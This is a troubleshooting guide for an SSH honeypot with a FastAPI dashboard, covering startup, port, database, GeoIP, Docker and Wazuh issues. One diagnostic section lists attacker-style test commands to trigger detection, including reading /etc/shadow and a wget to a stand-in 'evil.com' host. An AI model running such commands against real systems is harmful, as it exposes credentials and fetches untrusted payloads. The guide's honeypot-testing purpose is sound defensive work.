# Troubleshooting Guide — SSH Honeypot

Common issues, root causes, and step-by-step fixes.

---

## 🔴 Critical Issues

### Issue: `ModuleNotFoundError: No module named 'fastapi'`

**Symptom:** Python crashes immediately on startup  
**Root Cause:** The old `requirements.txt` listed Flask, but `web/app.py` uses FastAPI. This is fixed in the current package.

**Fix:**
```bash
pip install -r requirements.txt
# Verify:
python -c "import fastapi, uvicorn; print('OK')"
```

---

### Issue: Dashboard not accessible at http://localhost:5000

**Symptom:** Browser shows "Connection refused" or "ERR_CONNECTION_REFUSED"

**Possible causes:**

**A. Missing `--dashboard` flag:**
```bash
# Wrong:
python main.py --open

# Correct:
python main.py --open --dashboard
```

**B. Port already in use:**
```bash
lsof -i :5000          # macOS/Linux
netstat -ano | findstr 5000  # Windows

# Use a different port:
python main.py --open --dashboard --dashboard-port 8080
```

**C. Docker dashboard not exposed (old issue — now fixed):**
```bash
# Verify docker-compose.yml has both ports:
grep -A5 'ports:' docker-compose.yml
# Should show:
#   - "2222:2222"
#   - "5000:5000"

# If missing, recreate containers:
docker compose down
docker compose up -d
```

---

### Issue: SSH Connection Refused

**Symptom:** `ssh: connect to host localhost port 2222: Connection refused`

**Fix:**
```bash
# 1. Check if honeypot is running:
ps aux | grep "python main.py"

# 2. Check if port is bound:
netstat -tlnp | grep 2222    # Linux
netstat -an | findstr 2222   # Windows

# 3. Check for port conflicts:
lsof -i :2222

# 4. Start honeypot:
python main.py --open --dashboard
```

---

## 🟠 High Priority Issues

### Issue: No Real-Time Updates in Dashboard

**Symptom:** Dashboard loads but threat table and charts don't update when SSH connections come in

**Root Cause:** Dashboard and honeypot must run in the **same Python process** (they share in-memory data via `event_queue`).

**Wrong (two separate processes):**
```bash
# Terminal 1:
python main.py --open

# Terminal 2 (WRONG - won't see honeypot data):
python web/app.py
```

**Correct (single process with --dashboard flag):**
```bash
python main.py --open --dashboard
```

---

### Issue: Database Locked / Write Failures

**Symptom:** Log line: `{"event": "db_error", "error": "database is locked"}`

**Root Cause:** Old SQLite configuration without WAL mode (fixed in current version)

**Verify fix is applied:**
```bash
sqlite3 honeypot.db "PRAGMA journal_mode;"
# Should output: wal
```

**If still on default journal mode:**
```bash
sqlite3 honeypot.db "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;"
```

---

### Issue: Threat Alerts Not Appearing

**Symptom:** SSH commands run successfully but `logs/threats.log` stays empty

**Diagnostic steps:**

```bash
# 1. Confirm threats.log exists:
ls -la logs/

# 2. Connect and run threat-triggering commands:
# (In SSH session connected to honeypot)
cat /etc/passwd          # Triggers: RECON/T1087 - User enumeration
cat /etc/shadow          # Triggers: CRED_HUNT
wget http://evil.com/s   # Triggers: EXFIL
sudo id                  # Triggers: PRIVESC

# 3. Check threats log:
tail -20 logs/threats.log | python3 -m json.tool

# 4. Check database:
sqlite3 honeypot.db "SELECT * FROM threats LIMIT 5;"
```

---

### Issue: High Memory Usage

**Symptom:** Memory grows continuously; process uses 500 MB+

**Root Causes:**
1. Unbounded command output (e.g., `find /`)
2. Large nano editor buffer
3. Too many concurrent sessions

**Immediate mitigation:**
```bash
# Restart honeypot to free memory:
pkill -f "python main.py"
python main.py --open --dashboard

# Monitor memory:
watch -n 2 'ps aux | grep "python main.py" | grep -v grep | awk "{print \$6/1024\" MB\"}"'
```

**Permanent fix:** Add output truncation to `command_engine.py` (see `docs/analysis/TECHNICAL_FIXES.md` Fix #12)

---

## 🟡 Medium Priority Issues

### Issue: GeoIP Data Missing or Showing "Unknown"

**Symptom:** Dashboard shows all countries as "Unknown"

**Causes and fixes:**

**A. Private/localhost IP (expected):**
GeoIP is intentionally skipped for RFC-1918 private IPs (10.x, 172.16.x, 192.168.x).

**B. ip-api.com rate limited:**
```bash
# Free tier: 45 requests/minute. Check:
curl "http://ip-api.com/json/8.8.8.8"
# Should return JSON with country info
```

**C. No internet connection:**
GeoIP requires outbound HTTP to ip-api.com. If the server has no internet, GeoIP will fail silently.

---

### Issue: Log Files Not Created

**Symptom:** `logs/` directory is empty after running

**Fix:**
```bash
# Create log directory manually if missing:
mkdir -p logs

# Check permissions:
ls -la logs/

# Run honeypot and connect:
python main.py --open --dashboard &
ssh -p 2222 testuser@localhost   # triggers log creation
ls -la logs/
```

---

### Issue: Docker Build Fails

**Symptom:** `docker compose build` fails with errors

**Common errors:**

**A. SSL/gcc missing (should not happen with current Dockerfile):**
```bash
# Dockerfile already includes: gcc libssl-dev
# If still failing, check Docker's internet access
```

**B. Python package install fails:**
```bash
# Try building with verbose output:
docker compose build --no-cache honeypot

# Common fix: ensure requirements.txt is correct
cat requirements.txt | head -5
# Should show: paramiko, fastapi, uvicorn (not Flask)
```

---

### Issue: Wazuh Not Receiving Events

**Symptom:** Honeypot running but no alerts in Wazuh dashboard

**Diagnostic:**
```bash
# 1. Verify Wazuh host is reachable:
nc -z -w 3 <wazuh-ip> 514

# 2. Run with wazuh-host:
python main.py --open --wazuh-host <wazuh-ip>

# 3. Check Wazuh logs on manager:
tail -f /var/ossec/logs/ossec.log | grep honeypot

# 4. Verify decoders are installed:
ls /var/ossec/etc/decoders/honeypot_decoders.xml
```

---

## 🔵 Low Priority Issues

### Issue: `exit` or `logout` Command Doesn't Close Connection

**Symptom:** Typing `exit` shows "exit" but connection stays open

**Status:** Known limitation — the shell loop breaks, but the SSH transport may stay open for a few seconds. This is cosmetic only and doesn't affect logging.

---

### Issue: Commands Case Sensitive

**Symptom:** `LS` gives "command not found", `ls` works

**Status:** Known bug — not yet fixed  
**Quick fix:** See `docs/analysis/TECHNICAL_FIXES.md` Fix #8 (15 minutes)

---

### Issue: `ls | grep` Not Working

**Symptom:** Pipe operator `|` produces no output

**Status:** Piping not yet implemented  
**Workaround:** Use individual commands  
**Fix timeline:** See `docs/analysis/2-3_DAYS_ACTION_PLAN.md` Day 2

---

## 🛠️ Diagnostic Commands

```bash
# View all logs in real-time
tail -f logs/funnel.log logs/threats.log logs/cmd_audits.log

# JSON-format threats
tail -20 logs/threats.log | python3 -m json.tool

# Database contents
sqlite3 honeypot.db ".tables"
sqlite3 honeypot.db "SELECT COUNT(*) FROM commands;"
sqlite3 honeypot.db "SELECT * FROM threats ORDER BY detected_at DESC LIMIT 5;"

# Process health
ps aux | grep "python main.py"
lsof -i :2222 -i :5000

# Docker health
docker compose ps
docker compose logs --tail=50 honeypot

# Network connectivity test
nc -z localhost 2222 && echo "SSH OK"
curl -s http://localhost:5000/api/scores && echo "Dashboard OK"
```
